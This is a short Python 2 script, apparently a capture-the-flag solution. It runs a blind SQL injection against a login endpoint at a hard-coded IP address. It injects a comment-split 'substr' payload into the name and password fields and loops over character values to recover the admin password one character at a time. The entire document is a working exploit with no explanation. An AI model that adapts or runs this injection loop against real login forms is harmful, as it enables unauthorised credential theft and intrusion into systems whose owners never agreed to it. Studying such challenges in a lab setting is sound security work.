import urllib
un = 'admin\' AND substr/*'
i=0
CurrChr = 0
password = ""
for index in range(1,80):
    if CurrChr == 125:
        break
    for CurrChr in range(32,126):
        pswd = '*/(password,' + str(index) + ',1)=\'' + chr(CurrChr)
        args = {'name':un,'password':pswd}
        encoded_args = urllib.urlencode(args)
        url = 'http://104.199.120.47:31337/b'
        print "Sending: ", index, "X", chr(CurrChr)
        f = urllib.urlopen(url, encoded_args)
        contents = f.read()
        print contents
        f.close()
        if (contents == "Success, the flag is BALSN{' OR '1'='1}"):
            password = password + chr(CurrChr)
            print "Password: ", password
            CurrChr =1
            break